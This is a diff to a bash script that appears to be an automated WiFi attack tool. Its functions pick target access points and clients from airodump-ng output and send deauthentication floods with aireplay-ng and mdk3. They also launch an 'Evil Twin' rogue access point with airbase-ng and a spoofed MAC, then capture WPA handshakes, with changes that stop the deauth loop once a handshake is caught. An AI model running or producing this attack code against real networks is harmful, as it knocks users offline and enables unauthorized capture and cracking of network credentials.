@@ -314,11 +314,11 @@ fclientscan()															#Find active clients
 	clear
 	if [ $EVIL = 1 ] 2> /dev/null
 		then
-			CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n1)
+			CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
 			CIPHER=${CIPHER:1}
 			MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
 			CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
-			WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n1)
+			WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
 			WPA=${WPA:1}
 			if [ $MIXED = $CIPHER ] 2> /dev/null
 				then
@@ -425,6 +425,7 @@ fbotstart()																#Startup Autobot
 fautobot()																#Automagically find new target clients
 {	
 	sleep 0.7
+	BSSIDS=""
 	if [ $RESETCNT -gt 80 ] 2> /dev/null
 		then
 			killall airodump-ng
@@ -451,10 +452,11 @@ fautobot()																#Automagically find new target clients
 	fi
 	if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
 		then
-			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
+			echo "$(cat $HOME/tmpe-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
 			UNIQ="$(cat $HOME/tmp2 | sort -u)"
 			echo "$UNIQ" > $HOME/tmp2
 	fi
+
 	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
 		then
 			RESETCNT=$((RESETCNT + 1))
@@ -469,122 +471,138 @@ fautobot()																#Automagically find new target clients
 				else
 					if [ $(cat $OUTDIR/got | grep "$BSSID") -z ] 2> /dev/null
 						then
-							if [ $BSSIDS2 -z ] 2> /dev/null
+							if [ $BSSIDS -z ] 2> /dev/null
 								then
 									BSSIDS=$BSSID
-									MCNT=1
 								else
 									BSSIDS="$BSSIDS\n$BSSID"
-									MCNT=$((MCNT + 1))
 							fi
 					fi
 				fi
 		done < $HOME/tmp2
-	
+
 	if [ $BSSIDS -z ] 2> /dev/null
 		then
 			RESETCNT=$((RESETCNT + 1))
 			fautobot
-			
 	fi
-
-	if [ $MNUM -ge $MCNT ] 2> /dev/null
+	BSSIDS=$(echo -e "$BSSIDS" | sort -u)
+	if [ $NIC2 -z ] 2> /dev/null
 		then
-			MNUM=0
-	fi
-	MNUM=$((MNUM + 1))
-	BSSID=$(echo -e "$BSSIDS" | sed -n "$MNUM"p)
-	if [ $BSSID -z ] 2> /dev/null
-		then
-			RESETCNT=$((RESETCNT + 1))
-			fautobot
-			
-	fi
-	CLIENT=$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep "$BSSID" | cut -d ',' -f 1 | sed '/^$/d' | head -n 1)
-	POWER=$(cat $HOME/tmp-01.csv | grep $CLIENT | cut -d ',' -f 4)
-	POWER=${POWER:1}
-	if [ $CLIENT -z ] 2> /dev/null
-		then
-			fautobot
-	fi
-	ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
-	ESSID=${ESSID:1}
-	if [ $ESSID -z ] 2>/dev/null
-		then
-			RESETCNT=$((RESETCNT + 1))
-			fautobot
+			FCAT="$(cat $HOME/tmp-01.csv)"
 		else
-			if [ $POWERLIMIT -z ] 2> /dev/null
+			FCAT="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+	fi
+	for BSSID in $BSSIDS
+		do
+			if [ $BSSID -z ] 2> /dev/null
+				then
+					CLIENT=""
+				else
+					CLIENT=$(echo "$FCAT" | grep Station -A 7 | grep "$BSSID" | cut -d ',' -f 1 | sed '/^$/d' | head -n 1)
+			fi
+			if [ $CLIENT -z ] 2> /dev/null
 				then
 					A=1
 				else
-					if [ $POWER -gt $POWERLIMIT ] 2> /dev/null
-						then
-							fautobot
-					fi
+					POWER=$(echo "$FCAT" | grep $CLIENT | cut -d ',' -f 4 | head -n 1)
+					POWER=${POWER:1}
+					ESSID=$(echo "$FCAT" | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
+					ESSID=${ESSID:1}
+					SDONE=1
 			fi
-			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
-			CHAN=$((CHAN + 1 - 1))
-			if [[ $CHAN -gt 12 || $CHAN -lt 1 ]]
+			if [ $CLIENT -z ] 2> /dev/null
+				then
+					SDONE=""
+			elif [ $POWER -z ] 2> /dev/null
+				then
+					SDONE=""
+			elif [ $ESSID -z ] 2> /dev/null
+				then
+					SDONE=""
+			fi
+			if [ $SDONE = 1 ] 2> /dev/null
+				then
+					break
+			fi
+		done
+	
+	if [ $SDONE -z ] 2> /dev/null
+		then
+			RESETCNT=$((RESETCNT + 1))
+			fautobot
+	fi
+	
+	if [ $POWERLIMIT -z ] 2> /dev/null
+		then
+			A=1
+		else
+			if [ $POWER -gt $POWERLIMIT ] 2> /dev/null
 				then
 					fautobot
 			fi
-			clear
-			echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] "
-			echo
+	fi
+	CHAN=$(echo "$FCAT" | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
+	CHAN=$((CHAN + 1 - 1))
+	if [[ $CHAN -gt 12 || $CHAN -lt 1 ]]
+		then
+			fautobot
+	fi
+	clear
+	echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] "
+	echo
 			echo $GRN""" [*] Client found!:
  [*] ESSID: $ESSID
  [*] BSSID: $BSSID
  [*] Client: $CLIENT
  [*] Channel: $CHAN
  [*] Power: $POWER"""
-			echo $RED" [*] We need this handshake [*] "$RST
-			
-			if [ $EVIL = 1 ] 2> /dev/null
+	echo $RED" [*] We need this handshake [*] "$RST
+	
+	if [ $EVIL = 1 ] 2> /dev/null
+		then
+			CIPHER=$(echo "$FCAT"| grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
+			CIPHER=${CIPHER:1}
+			MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
+			CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
+			if [ $MIXED = $CIPHER ] 2> /dev/null
 				then
-					CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n1)
-					CIPHER=${CIPHER:1}
-					MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
-					CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
-					if [ $MIXED = $CIPHER ] 2> /dev/null
-						then
-							EVIL=1
-						else
-							echo
-							echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
-							echo
-							PUTEVIL=1
-							EVIL=""
-					fi
-					WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n1)
-					WPA=${WPA:1}
-			fi
-			killall airodump-ng
-			rm -rf $HOME/tmp*
-			sleep 0.4
-			if [ $EVIL -z ] 2> /dev/null
-				then
-					if [ $NIC2 -z ] 2> /dev/null
-						then
-							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-						else
-							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-							gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
-					fi
+					EVIL=1
 				else
-					case $CIPHER in
-						"CCMP")CIPHER=4;;
-						"TKIP")CIPHER=2
-					esac
-					case $WPA in
-						"WPA")BARG='-z ';;
-						"WPA2")BARG='-Z '
-					esac
-					PART1=${RANDOM:0:2}
-					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+					echo
+					echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
+					echo
+					PUTEVIL=1
+					EVIL=""
 			fi
-			fautocap
+			WPA=$(echo "$FCAT" | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
+			WPA=${WPA:1}
 	fi
+	killall airodump-ng
+	rm -rf $HOME/tmp*
+	sleep 0.4
+	if [ $EVIL -z ] 2> /dev/null
+		then
+			if [ $NIC2 -z ] 2> /dev/null
+				then
+					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+				else
+					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+					gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
+			fi
+		else
+			case $CIPHER in
+				"CCMP")CIPHER=4;;
+				"TKIP")CIPHER=2
+			esac
+			case $WPA in
+				"WPA")BARG='-z ';;
+				"WPA2")BARG='-Z '
+			esac
+			PART1=${RANDOM:0:2}
+			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+	fi
+	fautocap
 }
 		
 fautocap()																#Deauth targets and collect handshakes
@@ -660,7 +678,6 @@ fautocap()																#Deauth targets and collect handshakes
 			fi
 			if [ $NIC2 -z ] 2> /dev/null
 				then
-					echo $BLU;echo " [>] FIRE! [<] "
 					if [ $MDK -z ] 2> /dev/null
 						then
 							MACNUM=0
@@ -671,20 +688,24 @@ fautocap()																#Deauth targets and collect handshakes
 									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
 									sleep 1
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
+									fanalyze
+									if [ $GDONE = 1 ] 2> /dev/null
+										then
+											break
+									fi
 								done
 							sleep 3
 						else
 							echo $BSSID > $HOME/BSSIDB
 							gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
-							sleep 3 && killall mdk3 2> /dev/null&
-							sleep 6
+							sleep 5 && killall mdk3 2> /dev/null&
+							sleep 8
 					fi
 				else
 					if [ $EVIL -z ] 2> /dev/null
 						then
 							if [ $MDK -z ] 2> /dev/null
 								then
-									echo $BLU;echo " [>] FIRE ON $NIC2! [<] "
 									iw $MON2 set channel $CHAN
 									MACNUM=0
 									for CLIENT in $TARGETS
@@ -694,6 +715,11 @@ fautocap()																#Deauth targets and collect handshakes
 											aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
 											sleep 1
 											echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
+											fanalyze
+											if [ $GDONE = 1 ] 2> /dev/null
+												then
+													break
+											fi
 										done
 									sleep 3
 								else
@@ -708,7 +734,6 @@ fautocap()																#Deauth targets and collect handshakes
 									CHKBASE=1
 							fi
 							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
-							echo $BLU;echo " [>] FIRE ON $NIC! [<] "
 							FAKEMAC=${BSSID:0:12}'13:37'
 							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
 							sleep 2
@@ -720,6 +745,11 @@ fautocap()																#Deauth targets and collect handshakes
 									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
 									sleep 1
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
+									fanalyze
+									if [ $GDONE = 1 ] 2> /dev/null
+										then
+											break
+									fi
 								done
 							sleep 6
 					fi
